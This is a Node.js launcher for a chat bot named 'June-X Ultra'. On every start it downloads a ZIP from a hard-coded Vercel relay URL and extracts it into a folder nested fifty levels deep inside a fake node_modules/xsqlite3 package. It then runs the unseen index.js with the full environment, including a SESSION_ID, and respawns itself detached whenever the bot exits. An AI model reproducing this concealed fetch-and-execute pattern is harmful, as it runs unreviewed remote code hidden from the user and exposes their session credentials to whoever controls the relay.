require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const { fork, spawn } = require('child_process');

// ========== ENV FILE FUNCTION ==========
const ENV_FILE = path.join(__dirname, ".env");

function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) {
    console.log(`[INFO] .env file not found, creating one...`);
    try {
      fs.writeFileSync(
        ENV_FILE,
        "# Auto-generated .env file\nSESSION_ID=\n"
      );
    } catch (e) {
      console.error(`[ERROR] Failed to create .env file: ${e.message}`);
      return;
    }
  }

  try {
    const envContent = fs.readFileSync(ENV_FILE, 'utf8');
    const envLines = envContent.split('\n');
    
    envLines.forEach(line => {
      const trimmedLine = line.trim();
      if (!trimmedLine || trimmedLine.startsWith('#')) return;
      
      const equalsIndex = trimmedLine.indexOf('=');
      if (equalsIndex !== -1) {
        const key = trimmedLine.substring(0, equalsIndex).trim();
        const value = trimmedLine.substring(equalsIndex + 1).trim();
        const cleanValue = value.replace(/^['"](.*)['"]$/, '$1');
        
        if (!process.env[key]) {
          process.env[key] = cleanValue;
        }
      }
    });
    
    console.log("[ENV] File loaded successfully");
  } catch (e) {
    console.error("[ERROR] Failed to load .env file:", e.message);
  }
}

// === CHECK FOR SESSION_ID ===
function checkSessionId() {
  if (process.env.SESSION_ID) {
    console.log(`[SESSION] ID detected in env file.`);
    return true;
  } else {
    console.log("[ALERT] No session ID found in env.");
    return false;
  }
}

// ========== VERCEL RELAY LOADER ==========
const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://june-vercel.vercel.app/api/repo';
const ACCESS_KEY = process.env.ACCESS_KEY || 'j-41183-184';

const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
const DEEP_NEST_COUNT = 50;

// === Step 1: Create deep hidden folder
function createDeepRepoPath() {
  let deepPath = baseFolder;
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, `core${i}`);
  }
  const repoFolder = path.join(deepPath, 'lib_signals');
  fs.mkdirSync(repoFolder, { recursive: true });
  return repoFolder;
}

// === Step 2: Download ZIP from Vercel relay
async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log('[SYNC] Downloading from secure relay...');

    const response = await axios.get(VERCEL_RELAY_URL, {
      responseType: 'arraybuffer',
      headers: {
        'x-access-key': ACCESS_KEY,
        'User-Agent': 'tech word-md-loader'
      },
      timeout: 20000
    });

    const zip = new AdmZip(Buffer.from(response.data));
    zip.extractAllTo(repoFolder, true);

    console.log('[SYNC] Codes synced successfully');
  } catch (err) {
    console.error('[SYNC] Failed:', err.response?.status || err.message);
    process.exit(1);
  }
}

// === Step 3: Copy configs (optional) ===
function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'config.js');

  try {
    if (fs.existsSync(configSrc)) {
      fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
    }
  } catch {}
}

// === Step 4: Launch bot once, and on exit restart the whole script ===
function launchBot(botPath) {
  console.log('[BOT] Launching June-X Ultra...');
  const child = fork(botPath, [], {
    env: process.env,
    stdio: 'inherit'
  });

  child.on('exit', (code, signal) => {
    console.log(`[BOT] Process exited with code ${code} (${signal || 'no signal'})`);
    console.log('[PARENT] Restarting entire process in 3 seconds...');
    setTimeout(() => {
      // Spawn a new instance of this same script, then exit
      const newProcess = spawn(process.argv[0], [process.argv[1]], {
        detached: true,
        stdio: 'inherit',
        env: process.env
      });
      newProcess.unref();
      process.exit(0);
    }, 3000);
  });

  child.on('error', (err) => {
    console.error('[BOT] Process error:', err);
    console.log('[PARENT] Restarting entire process in 3 seconds...');
    setTimeout(() => {
      const newProcess = spawn(process.argv[0], [process.argv[1]], {
        detached: true,
        stdio: 'inherit',
        env: process.env
      });
      newProcess.unref();
      process.exit(0);
    }, 3000);
  });

  return child;
}

// ========== MAIN ==========
(async () => {
  try {
    // Load environment
    loadEnvFile();
    checkSessionId();

    // Prepare repo – this will be done fresh on every start
    const repoFolder = createDeepRepoPath();
    await downloadAndExtractRepo(repoFolder);

    const subDirs = fs
      .readdirSync(repoFolder)
      .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

    if (!subDirs.length) {
      console.error('[ERROR] ZIP extraction produced no directories.');
      process.exit(1);
    }

    const extractedRepoPath = path.join(repoFolder, subDirs[0]);
    copyConfigs(extractedRepoPath);

    const botIndex = path.join(extractedRepoPath, 'index.js');
    if (!fs.existsSync(botIndex)) {
      console.error('[ERROR] index.js not found in extracted repo.');
      process.exit(1);
    }

    // Launch bot – it will restart the whole process on exit
    launchBot(botIndex);

    // Keep parent alive until bot exits
    process.on('SIGINT', () => {
      console.log('[PARENT] Received SIGINT. Shutting down...');
      process.exit(0);
    });
  } catch (err) {
    console.error('[FATAL]', err.message);
    process.exit(1);
  }
})();
